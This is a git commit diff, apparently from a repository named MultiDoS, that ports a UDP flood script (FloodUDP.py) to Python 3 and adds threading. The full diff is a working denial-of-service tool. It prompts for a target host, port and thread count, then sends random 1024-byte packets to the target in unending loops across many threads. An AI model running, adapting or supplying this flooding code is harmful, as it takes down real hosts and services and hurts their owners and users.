3d9a3a9557b24f514b6397b08f31208465f9b1fd
Sc4r3Cr0w <52085661+UncleJ4ck@users.noreply.github.com>
2022-06-28 07:28:24 +0200

    fix: "fixing some bugs"
    and adding the threading

--- MultiDoS/FloodUDP.py
+++ MultiDoS/FloodUDP.py
@@ -1,6 +1,6 @@
-import socket, os, random, time
-
+import socket, os, random, time, threading
 from datetime import datetime
+
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -8,20 +8,31 @@ day = now.day
 month = now.month
 year = now.year
 
-
+ip = str(input("Host/Ip: "))
+port = int(input("Port: "))
+threads = int(input("Threads: "))
+   
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+data = random._urandom(1024)
+addr = (str(ip), int(port))
 
-ip = raw_input('Enter target's ip: ')
-port = input('Enter port: ')
-print "Attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+print("Attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year), end = "\n")
 time.sleep(3)
-print
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packets to %s throught port: %s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+
+def run():
+    global port
+    sent = 0
+    while True:
+        sock.sendto(data, addr)
+        sent += 1
+        print("Sent %s packets to %s throught port: %s"%(sent,ip,port))
+        if port == 65534:
+            port = 1
+               
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
+
+if __name__ == '__main__': 
+    run()
